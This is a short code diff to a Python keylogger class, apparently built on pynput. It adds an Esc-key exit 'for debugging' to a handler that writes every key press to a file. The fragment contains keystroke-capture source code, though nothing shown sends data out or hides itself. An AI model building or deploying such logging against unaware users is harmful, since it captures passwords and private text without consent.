@@ -12,6 +12,9 @@ class KeyLogger:
 
     def __on_press(self, key) -> None:
         self.fileHandler.print_key_to_file(key)
+        #For debugging
+        if(key == Key.esc):
+            return False
 
     def start_listener(self) -> None:
         with Listener(on_press=self.__on_press) as listener:
